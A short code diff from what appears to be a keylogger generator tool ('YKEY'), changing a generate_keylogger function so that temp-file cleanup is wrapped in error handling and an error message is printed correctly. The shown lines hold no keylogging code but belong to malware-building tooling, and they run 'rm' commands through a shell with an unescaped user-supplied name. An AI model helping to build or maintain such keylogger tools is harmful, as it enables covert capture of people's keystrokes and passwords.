@@ -114,16 +114,21 @@ def generate_keylogger(inputs_dict):
         print(colors.Green + '[✔]Your files have been saved to {}Dist{} {}dirrectory'.format(colors.BOLD, colors.RESET, colors.Green))
 
         print(colors.Yellow + '[!]Removing temp files......')
-        name = program_path + '/' + inputs_dict['PNAME']
-        check_output("rm '{}'.py".format(name), shell=True)
-        check_output("rm '{}'.spec".format(name), shell=True)
-        check_output("rm -R '{}/'build".format(program_path), shell=True)
-        check_output("rm -R '{}/'__pycache__".format(program_path), shell=True)
+        try:
+            name = program_path + '/' + inputs_dict['PNAME']
+            check_output("rm '{}'.py".format(name), shell=True)
+            check_output("rm '{}'.spec".format(name), shell=True)
+            check_output("rm -R '{}/'build".format(program_path), shell=True)
+            check_output("rm -R '{}/'__pycache__".format(program_path), shell=True)
+        except:
+            print(colors.Red + '[✘]Erroro occured while deleting the files')
+        
         print(colors.Green + '[✔]Generation successful\n' + colors.RESET)
+
 
     except Exception as error:
         print(colors.Red + '[✘]Erroro occured while activating the virtual environment')
-        print(colors.Red + '[✘]Error --> ' + error)
+        print(colors.Red + '[✘]Error --> ' + str(error))
         print(colors.Yellow + 'Please re install the YKEY program to get rid of this error')
         exit(0)
 
